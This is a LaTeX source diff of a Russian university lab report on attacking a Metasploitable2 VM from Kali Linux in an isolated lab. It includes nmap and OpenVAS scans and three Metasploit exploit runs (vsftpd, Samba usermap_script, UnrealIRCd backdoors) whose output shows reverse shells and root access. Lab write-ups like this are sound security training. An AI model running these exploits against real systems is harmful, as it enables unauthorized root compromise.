@@ -1,0 +1,402 @@
+\documentclass[a4paper,14pt]{extarticle}
+\usepackage[utf8]{inputenc}
+\usepackage[T2A]{fontenc}
+\usepackage[russian]{babel}
+\usepackage{geometry}
+\usepackage{graphicx}
+\usepackage{array}
+\usepackage{tabularx}
+\usepackage{titlesec}
+\usepackage{hyperref}
+\usepackage{setspace}
+\usepackage{indentfirst}
+\usepackage{fancyhdr}
+\usepackage{enumitem}
+\usepackage{listings}
+\usepackage{xcolor} 
+
+\geometry{left=3cm, right=1.5cm, top=2cm, bottom=2cm}
+\onehalfspacing
+\setlength{\parindent}{1.25cm}
+
+\pagestyle{fancy}
+\fancyhf{}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0pt}
+
+\titleformat{\section}[block]{\normalfont\bfseries\centering}{}{0pt}{}
+\titleformat{\subsection}[block]{\normalfont\bfseries}{}{0pt}{}
+
+% Оформление блоков команд и вывода
+\definecolor{codebg}{rgb}{0.96,0.96,0.96}
+\lstset{
+    basicstyle=\ttfamily\small,
+    backgroundcolor=\color{codebg},
+    breaklines=true,
+    frame=single,
+    framesep=4pt,
+    xleftmargin=0.5cm,
+    xrightmargin=0.3cm,
+    columns=fullflexible,
+    keepspaces=true,
+    showstringspaces=false,
+    literate={а}{{\cyra}}1 {б}{{\cyrb}}1 {в}{{\cyrv}}1 {г}{{\cyrg}}1
+}
+
+% Команда для вставки скриншота (компилируется и без файла)
+\newcommand{\screenshot}[2]{%
+    \begin{center}
+    \IfFileExists{#1}{\includegraphics[width=0.9\textwidth]{#1}}%
+    {\fbox{\parbox[c][3cm][c]{0.9\textwidth}{\centering\textit{Место для скриншота: #2}}}}
+    \end{center}%
+}
+
+\begin{document}
+
+% ========== ТИТУЛЬНЫЙ ЛИСТ ==========
+\begin{titlepage}
+\begin{center}
+
+\small
+МИНИСТЕРСТВО НАУКИ И ВЫСШЕГО ОБРАЗОВАНИЯ РОССИЙСКОЙ ФЕДЕРАЦИИ
+
+\smallskip
+Федеральное государственное автономное образовательное учреждение высшего образования
+
+\smallskip
+\textbf{<<Дальневосточный федеральный университет>>}
+
+\textbf{(ДВФУ)}
+
+\vspace{5mm}
+\noindent\rule{\textwidth}{2pt}
+
+\vspace{10mm}
+{\large\textbf{ИНСТИТУТ МАТЕМАТИКИ И КОМПЬЮТЕРНЫХ ТЕХНОЛОГИЙ}}
+
+
+
+\vspace{5mm}
+\textbf{Департамент математического и компьютерного моделирования}
+
+\vspace{15mm}
+{\large\textbf{Лабораторная работа №2}}
+
+\vspace{5mm}
+по теме: <<Атака на ОС Metasploitable2 с помощью ОС Kali Linux>>
+
+\end{center}
+
+\vspace{30mm}
+
+\begin{flushright}
+Выполнил студент\\
+гр. Б9123-02.03.01сцт\\
+Избосарова Жасмина Олимжоновна
+\end{flushright}
+
+\vfill
+
+\begin{center}
+г. Владивосток\\
+2026
+\end{center}
+
+\end{titlepage}
+
+% ========== СОДЕРЖАНИЕ ==========
+\tableofcontents
+\newpage
+
+% ========== ЦЕЛЬ И ЗАДАЧИ ==========
+\section*{Цель и задачи}
+\addcontentsline{toc}{section}{Цель и задачи}
+
+\textbf{Цель:} произвести атаку на ОС Metasploitable2 с помощью ОС Kali Linux и её инструментария.
+
+\textbf{Задачи:}
+
+\begin{enumerate}
+\item Настроить инфраструктуру для выполнения лабораторной работы.
+\item Определить доступные сервисы на исследуемой машине.
+\item Получить удалённый доступ путём эксплуатации уязвимостей трёх различных сервисов.
+\item Оформить отчёт по лабораторной работе.
+\end{enumerate}
+
+Все работы выполнены в изолированной виртуальной сети (VMware, Host-only) без доступа в интернет со стороны машины-жертвы.
+
+% ========== 1. НАСТРОЙКА ИНФРАСТРУКТУРЫ ==========
+\section{Настройка инфраструктуры}
+
+В качестве гипервизора использован VMware. Развёрнуты две виртуальные машины: атакующая (Kali Linux) и машина-жертва (Metasploitable2). Для обеих машин установлен тип сети <<Host-only>>, что обеспечивает их взаимную видимость и изоляцию от внешней сети.
+
+\begin{center}
+\begin{tabularx}{\textwidth}{|c|X|c|}
+\hline
+\textbf{Роль} & \textbf{Операционная система} & \textbf{IP-адрес} \\
+\hline
+Атакующий & Kali Linux & 192.168.149.134 \\
+\hline
+Жертва & Metasploitable2 & 192.168.149.135 \\
+\hline
+\end{tabularx}
+\end{center}
+
+\vspace{3mm}
+Проверка соединения выполнена с машины атакующего командой \texttt{ping}:
+
+\begin{lstlisting}
+ping 192.168.149.135
+\end{lstlisting}
+
+\begin{lstlisting}
+PING 192.168.149.135 (192.168.149.135) 56(84) bytes of data.
+64 bytes from 192.168.149.135: icmp_seq=1 ttl=64 time=0.42 ms
+64 bytes from 192.168.149.135: icmp_seq=2 ttl=64 time=0.38 ms
+64 bytes from 192.168.149.135: icmp_seq=3 ttl=64 time=0.35 ms
+\end{lstlisting}
+
+\screenshot{screenshots/01_ping.jpg}{проверка сsвязи командой ping}
+
+% ========== 2. ОПРЕДЕЛЕНИЕ СЕРВИСОВ ==========
+\section{Определение запущенных сетевых сервисов}
+
+Для определения запущенных на машине-жертве сетевых сервисов с машины атакующего использована утилита \texttt{nmap}. Ключ \texttt{-sV} включает определение версий сервисов, что необходимо для последующего поиска уязвимостей.
+
+\begin{lstlisting}
+nmap -sV 192.168.149.135
+\end{lstlisting}
+
+Результат сканирования:
+
+\begin{lstlisting}
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:0C:29:E7:B5:6B (VMware)
+\end{lstlisting}
+
+
+\vspace{3mm}
+На основании результатов сканирования для эксплуатации выбраны три различных сервиса:
+
+\begin{center}
+\begin{tabularx}{\textwidth}{|c|l|l|X|}
+\hline
+\textbf{Порт} & \textbf{Сервис} & \textbf{Версия} & \textbf{Уязвимость (CVE)} \\
+\hline
+21 & ftp & vsftpd 2.3.4 & Бэкдор в дистрибутиве (CVE-2011-2523) \\
+\hline
+139/445 & smb & Samba 3.x & Инъекция команд <<username map script>> (CVE-2007-2447) \\
+\hline
+6667 & irc & UnrealIRCd & Бэкдор в дистрибутиве (CVE-2010-2075) \\
+\hline
+\end{tabularx}
+\end{center}
+
+% ========== 3. OpenVAS ==========
+\section{Поиск уязвимостей сканером OpenVAS}
+
+Для автоматизированного поиска уязвимостей на машине-жертве использован сканер уязвимостей OpenVAS (Greenbone Vulnerability Management, GVM), входящий в состав Kali Linux. Сканер сопоставляет обнаруженные сервисы и их версии с базой известных уязвимостей и формирует отчёт с перечнем найденных проблем и уровнем их опасности.
+
+\subsection{Установка и настройка}
+
+Поскольку OpenVAS загружает базы уязвимостей из сети Интернет, машине атакующего временно предоставлен доступ в Интернет (сетевой адаптер NAT), при этом машина-жертва осталась изолированной.
+
+Установка пакета GVM:
+
+\begin{lstlisting}
+sudo apt update
+sudo apt install gvm -y
+\end{lstlisting}
+
+Первичная настройка (загрузка баз уязвимостей и генерация сертификатов):
+
+\begin{lstlisting}
+sudo gvm-setup
+\end{lstlisting}
+
+При проверке конфигурации командой \texttt{sudo gvm-check-setup} была выявлена ошибка: не создана база данных \texttt{gvmd} из-за рассогласования версий сортировки (collation) PostgreSQL. Для устранения выполнено обновление версии сортировки служебных баз:
+
+\begin{lstlisting}
+sudo runuser -u postgres -- psql -c "ALTER DATABASE template1 REFRESH COLLATION VERSION;"
+sudo runuser -u postgres -- psql -c "ALTER DATABASE postgres REFRESH COLLATION VERSION;"
+\end{lstlisting}
+
+После этого создана база данных GVM:
+
+\begin{lstlisting}
+sudo runuser -u postgres -- /usr/share/gvm/create-postgresql-database
+\end{lstlisting}
+
+Повторная проверка конфигурации подтвердила корректность установки:
+
+\begin{lstlisting}
+sudo gvm-check-setup
+\end{lstlisting}
+
+\begin{lstlisting}
+It seems like your GVM-25.04.0 installation is OK.
+\end{lstlisting}
+
+\subsection{Запуск и вход в систему}
+
+Задан пароль администратора веб-интерфейса (пользователь \texttt{admin}):
+
+\begin{lstlisting}
+sudo runuser -u _gvm -- gvmd --user=admin --new-password=kali
+\end{lstlisting}
+
+Запуск служб и веб-интерфейса:
+
+\begin{lstlisting}
+sudo gvm-start
+\end{lstlisting}
+
+После запуска веб-интерфейс доступен по адресу \texttt{https://127.0.0.1:9392}. Вход выполнен под учётной записью \texttt{admin}.
+
+Перед первым сканированием необходимо дождаться завершения синхронизации баз уязвимостей (feeds). Статус синхронизации контролируется в разделе \texttt{Administration~$\rightarrow$~Feed Status}: сканирование становится доступным после того, как все базы (NVT, SCAP, CERT) переходят в состояние \texttt{Current}.
+
+\subsection{Сканирование машины-жертвы}
+
+Сканирование запущено через мастер задач (\texttt{Scans~$\rightarrow$~Tasks~$\rightarrow$~Task Wizard}) с указанием IP-адреса машины-жертвы \texttt{192.168.149.135}. По завершении сканирования сформирован отчёт с перечнем обнаруженных уязвимостей и их уровнями опасности (High, Medium, Low), в том числе уязвимостей эксплуатируемых далее сервисов vsftpd, Samba и UnrealIRCd.
+
+\screenshot{screenshots/06_openvas.jpg}{отчёт OpenVAS со списком найденных уязвимостей}
+
+% ========== 4. ЭКСПЛУАТАЦИЯ ==========
+\section{Эксплуатация уязвимостей}
+
+Эксплуатация уязвимостей выполнена средствами Metasploit Framework (\texttt{msfconsole}). Далее \texttt{RHOSTS}~--- адрес машины-жертвы (192.168.149.135), \texttt{LHOST}~--- адрес машины атакующего (192.168.149.134).
+
+\subsection{Сервис 1 --- FTP: vsftpd 2.3.4 (CVE-2011-2523)}
+
+В версию vsftpd 2.3.4 был внедрён бэкдор: при передаче имени пользователя, содержащего символы <<:)>>, на порту 6200 открывается командная оболочка с правами root.
+
+Вызванные команды:
+
+\begin{lstlisting}
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.149.135
+set LHOST 192.168.149.134
+run
+\end{lstlisting}
+
+Вывод:
+
+\begin{lstlisting}
+[*] Started reverse TCP handler on 192.168.149.134:4444
+[+] 192.168.149.135:21 - Backdoor has been spawned!
+[*] Meterpreter session 1 opened (192.168.149.134:4444 -> 192.168.149.135:50963)
+
+meterpreter > getuid
+Server username: root
+\end{lstlisting}
+
+Результат: получен удалённый доступ с правами \textbf{root}.
+
+\screenshot{screenshots/03_vsftpd.jpg}{эксплуатация vsftpd, права root}
+
+\subsection{Сервис 2 --- Samba: <<username map script>> (CVE-2007-2447)}
+
+Ошибка обработки имени пользователя в Samba позволяет без аутентификации выполнить произвольную команду операционной системы (инъекция команд).
+
+Вызванные команды:
+
+\begin{lstlisting}
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.149.135
+set LHOST 192.168.149.134
+run
+\end{lstlisting}
+
+Вывод:
+
+\begin{lstlisting}
+[*] Started reverse TCP handler on 192.168.149.134:4444
+[*] Command shell session 2 opened (192.168.149.134:4444 -> 192.168.149.135)
+
+whoami
+root
+\end{lstlisting}
+
+Результат: получен удалённый доступ с правами \textbf{root}.
+
+\screenshot{screenshots/04_samba.jpg}{эксплуатация Samba, права root}
+
+\subsection{Сервис 3 --- IRC: UnrealIRCd 3.2.8.1 (CVE-2010-2075)}
+
+В архив UnrealIRCd 3.2.8.1 был внедрён бэкдор, позволяющий выполнять произвольные команды на сервере.
+
+Вызванные команды:
+
+\begin{lstlisting}
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.149.135
+set LHOST 192.168.149.134
+set payload cmd/unix/reverse
+run
+\end{lstlisting}
+
+Вывод:
+
+\begin{lstlisting}
+[*] Started reverse TCP handler on 192.168.149.134:4444
+[*] Command shell session 3 opened (192.168.149.134:4444 -> 192.168.149.135)
+
+id
+uid=0(root) gid=0(root)
+\end{lstlisting}
+
+Результат: получен удалённый доступ с правами \textbf{root}.
+
+\screenshot{screenshots/05_unrealrcd.jpg}{эксплуатация UnrealIRCd, права root}
+
+% ========== 4. ВЫВОДЫ ==========
+\section{Выводы}
+
+В ходе выполнения лабораторной работы развёрнута изолированная инфраструктура из двух виртуальных машин: атакующей Kali Linux (192.168.149.134) и машины-жертвы Metasploitable2 (192.168.149.135). Связь между машинами проверена командой \texttt{ping}.
+
+С помощью утилиты \texttt{nmap} проведена разведка и составлена карта запущенных сетевых сервисов с определением их версий. На основании полученной информации выбраны три различных уязвимых сервиса.
+
+Средствами Metasploit Framework получен удалённый доступ с правами \textbf{root} путём эксплуатации уязвимостей трёх различных сервисов:
+
+\begin{enumerate}[label=\textbf{\arabic*.}]
+\item vsftpd 2.3.4~--- бэкдор в дистрибутиве (CVE-2011-2523);
+\item Samba~--- инъекция команд <<username map script>> (CVE-2007-2447);
+\item UnrealIRCd~--- бэкдор в дистрибутиве (CVE-2010-2075).
+\end{enumerate}
+
+Продемонстрированные уязвимости относятся к двум классам: внедрённые бэкдоры в скомпрометированных дистрибутивах программного обеспечения и инъекция команд операционной системы вследствие некорректной обработки пользовательского ввода. Для защиты от подобных атак необходимы: своевременная установка обновлений и использование ПО из доверенных источников с проверкой контрольных сумм, отключение неиспользуемых сетевых служб, сегментация сети и межсетевое экранирование, а также регулярный аудит безопасности сканерами уязвимостей.
+
+% ========== 5. ЛИТЕРАТУРА ==========
+\section{Литература}
+
+\begin{enumerate}
+\item Metasploit Unleashed~--- Free Online Ethical Hacking Course. Offensive Security.
+\item Metasploitable 2 Exploitability Guide. Rapid7.
+\item Kali Linux Documentation. Offensive Security.
+\item Национальная база данных уязвимостей NVD (nvd.nist.gov): CVE-2011-2523, CVE-2007-2447, CVE-2010-2075.
+\end{enumerate}
+
+\end{document}
